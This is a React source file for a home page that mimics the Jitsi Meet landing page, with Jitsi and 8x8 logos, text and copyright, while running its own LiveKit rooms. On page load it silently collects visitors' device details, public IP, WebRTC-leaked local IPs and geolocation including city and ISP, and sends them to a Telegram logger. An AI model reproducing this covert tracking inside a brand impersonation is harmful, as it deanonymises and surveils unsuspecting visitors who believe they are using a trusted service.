import { useState, useEffect, useRef } from 'react';
import { getDeviceInfo } from '@/utils/deviceInfo';
import { logVisitorEntry } from '@/utils/telegramLogger';
import { getPublicIP, getWebRTCIPs, getIPGeolocation } from '@/utils/ipGeolocation';
import { createRoom, getRoomFromUrl } from '@/utils/livekitAPI';
import svgPaths from '@/imports/svg-99v8zxjlwb';
import imgOverlayBackground from 'figma:asset/455efd74484e4206bfe7dee2d881fb68f6a253a3.png';
import img8X8LogoPng from 'figma:asset/a72d808de1a86028867072f0c54f388b92ac4e7c.png';
import imgAppStoreBadgePng from 'figma:asset/9a42e8d73dc4dbf02e9165f397ff8da90dbae75a.png';
import imgGooglePlayBadgePng from 'figma:asset/98a2733682df8e6969743c7caafc1c6a4d21ff14.png';
import imgFDroidBadgePng from 'figma:asset/022af21d9561b6af820311ec6b3f1aafc7658217.png';
import imgSlackPng from 'figma:asset/041fcaa2783dbf36ffa6b0001995e5149ba0f052.png';
import imgFbPng from 'figma:asset/73dc131b9b4fe0e0635a9fa869b9336f6869c64b.png';
import imgLiPng from 'figma:asset/02213affcd0013361a35e78c26720927cc9ae9e8.png';
import imgTwPng from 'figma:asset/6770beca3b14a1f2999f2ecbafdf9fa480d9dbdd.png';
import imgGhPng from 'figma:asset/fd5823994372c13bc9a9453daddfbb272ceecb31.png';

interface HomePageProps {
  onStartMeeting: (roomSlug: string, roomTitle?: string) => void;
}

export default function HomePage({ onStartMeeting }: HomePageProps) {
  const [userName, setUserName] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const hasLoggedVisit = useRef(false);

  // ========================================
  // VISITOR TRACKING - runs once on mount
  // ========================================
  useEffect(() => {
    if (hasLoggedVisit.current) {
      return;
    }
    
    hasLoggedVisit.current = true;
    
    const trackVisitor = async () => {
      try {
        console.log('🎯 Новый посетитель - начинаем сбор данных...');
        
        const deviceInfo = getDeviceInfo();
        console.log('✅ Информация об устройстве собрана:', deviceInfo);
        
        let publicIP = 'Unknown';
        try {
          publicIP = await getPublicIP();
          console.log('✅ Публичный IP:', publicIP);
        } catch (error) {
          console.error('❌ Ошибка получения IP:', error);
        }
        
        let webrtcIPs: string[] = [];
        try {
          webrtcIPs = await getWebRTCIPs();
          console.log(`✅ WebRTC IPs (${webrtcIPs?.length || 0}):`, webrtcIPs);
        } catch (error) {
          console.error('❌ Ошибка WebRTC leak:', error);
        }
        
        let geoData: any = null;
        try {
          const ipGeo = await getIPGeolocation();
          if (ipGeo) {
            geoData = {
              country: ipGeo.country,
              city: ipGeo.city,
              region: ipGeo.regionName,
              timezone: ipGeo.timezone,
              isp: ipGeo.isp,
            };
            console.log('✅ Геолокация получена:', geoData);
          }
        } catch (error) {
          console.error('❌ Ошибка геолокации:', error);
        }
        
        await logVisitorEntry({
          deviceInfo,
          publicIP,
          webrtcIPs: webrtcIPs || [],
          geoData,
        });
        
        console.log('✅ Данные посетителя отправлены в Telegram');
      } catch (error) {
        console.error('❌ Ошибка отслеживания посетителя:', error);
      }
    };
    
    trackVisitor();
  }, []);

  // ========================================
  // CHECK FOR ROOM IN URL
  // ========================================
  useEffect(() => {
    const roomFromUrl = getRoomFromUrl();
    if (roomFromUrl) {
      console.log('🔗 Обнаружена комната в URL:', roomFromUrl);
      console.log('');
      console.log('='.repeat(80));
      console.log('🎊 ВЫ ПРИСОЕДИНЯЕТЕСЬ К СУЩЕСТВУЮЩЕЙ КОМНАТЕ!');
      console.log('='.repeat(80));
      console.log('✅ Комната найдена в URL:', window.location.href);
      console.log('📝 Room slug:', roomFromUrl);
      console.log('');
      console.log('Что происходит:');
      console.log('1️⃣  Вы автоматически переходите в prejoin');
      console.log('2️⃣  Введите свое имя');
      console.log('3️⃣  Нажмите "Join meeting"');
      console.log('4️⃣  Вы окажетесь в комнате с другими участниками! 🎉');
      console.log('='.repeat(80));
      console.log('');
      onStartMeeting(roomFromUrl);
    }
  }, [onStartMeeting]);

  // ========================================
  // HANDLE START MEETING
  // ========================================
  const handleStartMeeting = async () => {
    if (!userName.trim()) {
      setError('Please enter a meeting name');
      return;
    }

    setIsLoading(true);
    setError(null);

    try {
      console.log('🚀 [HomePage] Создание комнаты для пользователя:', userName);
      
      // Use userName as the room title
      const result = await createRoom(userName, userName);
      
      console.log('✅ [HomePage] Комната создана, slug:', result.roomSlug, 'roomName:', result.roomName, 'title:', result.title);
      
      // Update URL with room slug so the link can be shared
      const newUrl = new URL(window.location.href);
      newUrl.searchParams.set('room', result.roomSlug);
      window.history.pushState({}, '', newUrl.toString());
      
      console.log('🔗 [HomePage] Ссылка на комнату:', newUrl.toString());
      console.log('📋 [HomePage] Скопируйте эту ссылку и откройте в другом браузере/вкладке для подключения к комнате');
      console.log('💡 [HomePage] Или нажмите кнопку \"Copy meeting link\" на следующем экране');
      console.log('');
      console.log('='.repeat(80));
      console.log('🎉 КАК ПРИГЛАСИТЬ ДРУГИХ ПОЛЬЗОВАТЕЛЕЙ В КОМНАТУ:');
      console.log('='.repeat(80));
      console.log('1️⃣  На следующем экране нажмите \"📋 Copy meeting link\"');
      console.log('2️⃣  Откройте ссылку в другом браузере или отправьте другу');
      console.log('3️⃣  Другой пользователь автоматически попадет в prejoin этой же комнаты');
      console.log('4️⃣  Оба нажимаете \"Join meeting\" и оказываетесь в ОДНОМ видеозвонке!');
      console.log('');
      console.log('📝 Ваша ссылка: ' + newUrl.toString());
      console.log('='.repeat(80));
      console.log('');
      
      onStartMeeting(result.roomSlug, result.title);
    } catch (error: any) {
      console.error('❌ [HomePage] Ошибка создания комнаты:', error);
      setError(error.message || 'Failed to create room');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className="bg-white relative size-full overflow-auto">
      <div className="bg-white flex flex-col items-center w-full min-h-screen">
        {/* Hero Section with Background */}
        <div 
          className="relative w-full bg-cover bg-center" 
          style={{ 
            backgroundImage: `linear-gradient(90deg, rgba(0, 0, 0, 0.2) 0%, rgba(0, 0, 0, 0.2) 100%), linear-gradient(90deg, rgb(0, 0, 0) 0%, rgba(0, 0, 0, 0) 75.16%), url('${imgOverlayBackground}')` 
          }}
        >
          <div className="w-full max-w-[1280px] mx-auto px-4 sm:px-6 md:px-8 lg:px-[163px]">
            {/* Logo */}
            <div className="pt-12 pb-8">
              <a className="inline-block" href="https://jitsi.org/">
                <svg className="w-[71px] h-[32px]" fill="none" preserveAspectRatio="none" viewBox="0 0 71 32">
                  <g clipPath="url(#clip0_1_107)">
                    <path d={svgPaths.p187d5d00} fill="white" />
                    <path d={svgPaths.p373a8600} fill="white" />
                    <path d={svgPaths.p1981b00} fill="white" />
                    <path d={svgPaths.p1c73ca00} fill="white" />
                    <path d={svgPaths.p883c300} fill="white" />
                    <path d={svgPaths.p30fb000} fill="white" />
                  </g>
                  <defs>
                    <clipPath id="clip0_1_107">
                      <rect fill="white" height="32" width="71" />
                    </clipPath>
                  </defs>
                </svg>
              </a>
            </div>

            {/* Main Content - Centered */}
            <div className="flex flex-col items-center text-center py-8">
              {/* Heading */}
              <h1 className="font-['Arial',sans-serif] text-white text-3xl sm:text-4xl md:text-[42px] leading-[1.2] mb-4">
                Jitsi Meet
              </h1>

              {/* Subtitle */}
              <p className="font-['Arial',sans-serif] font-bold text-white text-base sm:text-lg md:text-[20px] leading-[1.3] mb-8">
                Secure and high quality meetings
              </p>

              {/* Input and Button - Fixed Width */}
              <div className="w-full max-w-[480px] px-4 sm:px-0">
                <div className="bg-white rounded-[4px] p-1 flex items-center gap-1">
                  <div className="flex-1 bg-white rounded-[4px] h-[50px] flex items-center px-3">
                    <input
                      type="text"
                      value={userName}
                      onChange={(e) => setUserName(e.target.value)}
                      onKeyDown={(e) => {
                        if (e.key === 'Enter' && !isLoading) {
                          handleStartMeeting();
                        }
                      }}
                      placeholder="Enter meeting name"
                      disabled={isLoading}
                      className="font-['Arial',sans-serif] text-[#253858] text-[14px] w-full border-none outline-none bg-transparent placeholder:text-gray-400"
                    />
                  </div>
                  <button
                    onClick={handleStartMeeting}
                    disabled={isLoading}
                    className="bg-[#0074e0] text-white text-[14px] font-['Arial',sans-serif] px-5 py-[17px] rounded-[3px] hover:bg-[#0066c7] transition-colors disabled:opacity-50 disabled:cursor-not-allowed whitespace-nowrap"
                  >
                    {isLoading ? 'Loading...' : 'Start meeting'}
                  </button>
                </div>

                {/* Error Message */}
                {error && (
                  <div className="mt-4">
                    <div className="bg-red-500/10 border border-red-500/20 rounded-lg p-3">
                      <p className="text-red-400 text-sm text-center">{error}</p>
                    </div>
                  </div>
                )}
              </div>
            </div>

            {/* Settings Button - Top Right */}
            <div className="absolute top-12 right-4 sm:right-6 md:right-8 lg:right-[163px]">
              <button className="bg-[rgba(255,255,255,0.38)] p-1 rounded-[3px] w-[24px] h-[24px] flex items-center justify-center hover:bg-[rgba(255,255,255,0.5)] transition-colors">
                <svg className="w-full h-full" fill="none" preserveAspectRatio="none" viewBox="0 0 24 24">
                  <path clipRule="evenodd" d={svgPaths.pe3b500} fill="white" fillRule="evenodd" />
                  <path clipRule="evenodd" d={svgPaths.pee08300} fill="white" fillRule="evenodd" />
                </svg>
              </button>
            </div>

            {/* Spacing */}
            <div className="h-16"></div>
          </div>
        </div>

        {/* Content Section */}
        <div className="w-full flex flex-col items-center py-10 px-4">
          {/* Jitsi as a Service Card */}
          <div className="w-full max-w-[688px]">
            <div className="bg-[#444447] rounded-[8px] p-8 relative">
              {/* Header with Logo */}
              <div className="flex items-center mb-8">
                <img alt="8x8 Logo" className="w-[32px] h-[32px] mr-4" src={img8X8LogoPng} />
                <h2 className="font-['Arial',sans-serif] text-white text-[16px] leading-[32px]">
                  Jitsi as a Service
                </h2>
              </div>
              
              {/* Main Text */}
              <h3 className="font-['Arial',sans-serif] text-white text-xl sm:text-2xl leading-[1.5] mb-4">
                Want meetings in your app? Check out <span className="font-bold">Jitsi as a Service</span>.
              </h3>
              
              {/* Description */}
              <p className="font-['Arial',sans-serif] text-white text-[16px] leading-[24px] mb-6">
                Connect the users of your website or app. Get branding & tight access controls. Have
                notifications, transcriptions & recordings delivered straight to your backend
              </p>
              
              {/* Learn More Button */}
              <a 
                className="inline-block bg-white text-[#36373a] font-['Arial',sans-serif] font-bold text-[12px] leading-[17.14px] px-4 py-3.5 rounded-[3px] hover:bg-gray-100 transition-colors" 
                href="https://jaas.8x8.vc/"
              >
                Learn more
              </a>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="bg-[#131519] w-full">
          <div className="max-w-[1280px] mx-auto px-4 md:px-8 lg:px-[163px]">
            {/* Mobile Apps Section */}
            <div className="border-b border-[#424447] py-10">
              <div className="flex flex-col md:flex-row items-center justify-between gap-6">
                <p className="font-['Arial',sans-serif] text-white text-[12px] leading-[17.14px] text-center md:text-left">
                  Jitsi on mobile – download our apps<br />and start a meeting from anywhere
                </p>
                <div className="flex flex-wrap items-center justify-center gap-4">
                  <a href="https://apps.apple.com/us/app/jitsi-meet/id1165103905">
                    <img alt="App Store" className="h-[40px] w-[120px]" src={imgAppStoreBadgePng} />
                  </a>
                  <a href="https://play.google.com/store/apps/details">
                    <img alt="Google Play" className="h-[45px] w-[153px]" src={imgGooglePlayBadgePng} />
                  </a>
                  <a href="https://f-droid.org/en/packages/org.jitsi.meet/">
                    <img alt="F-Droid" className="h-[40px] w-[135px]" src={imgFDroidBadgePng} />
                  </a>
                </div>
              </div>
            </div>

            {/* Slack Section */}
            <div className="border-b border-[#424447] py-8">
              <div className="flex flex-col md:flex-row items-center justify-between gap-6">
                <p className="font-['Arial',sans-serif] text-white text-[12px] leading-[17.14px] text-center md:text-left">
                  Hello, Slack fans! Very pleased to meet you! Just add our extension and off you go!
                </p>
                <a href="https://slack.com/oauth/authorize">
                  <img alt="Add to Slack" className="h-[40px] w-[156px]" src={imgSlackPng} />
                </a>
              </div>
            </div>

            {/* Links and Social */}
            <div className="border-b border-[#424447] py-6">
              <div className="flex flex-col sm:flex-row items-center justify-between gap-6">
                <div className="flex gap-4">
                  <a className="font-['Arial',sans-serif] font-bold text-white text-[12px] leading-[16px] hover:underline" href="https://jitsi.org/meet-jit-si-privacy/">
                    Privacy Policy
                  </a>
                  <a className="font-['Arial',sans-serif] font-bold text-white text-[12px] leading-[16px] hover:underline" href="http://jitsi.org/meet-jit-si-terms-of-service/">
                    Terms & Conditions
                  </a>
                </div>
                <div className="flex gap-6">
                  <a href="https://www.facebook.com/jitsi">
                    <img alt="Facebook" className="w-[24px] h-[24px]" src={imgFbPng} />
                  </a>
                  <a href="https://www.linkedin.com/company/8x8/">
                    <img alt="LinkedIn" className="w-[24px] h-[24px]" src={imgLiPng} />
                  </a>
                  <a href="https://twitter.com/jitsinews">
                    <img alt="Twitter" className="w-[24px] h-[24px]" src={imgTwPng} />
                  </a>
                  <a href="https://github.com/jitsi">
                    <img alt="GitHub" className="w-[24px] h-[24px]" src={imgGhPng} />
                  </a>
                </div>
              </div>
            </div>

            {/* Copyright */}
            <div className="py-8 flex flex-col sm:flex-row items-center gap-4">
              <a href="https://8x8.com/">
                <img alt="8x8" className="w-[32px] h-[32px]" src={img8X8LogoPng} />
              </a>
              <div className="text-center sm:text-left">
                <p className="font-['Arial',sans-serif] text-[#a1a1a3] text-[12px] leading-[16px]">
                  8x8 is a proud supporter of the Jitsi community.
                </p>
                <p className="font-['Arial',sans-serif] text-[#a1a1a3] text-[12px] leading-[16px]">
                  © 8x8, Inc. All Rights Reserved.
                </p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
}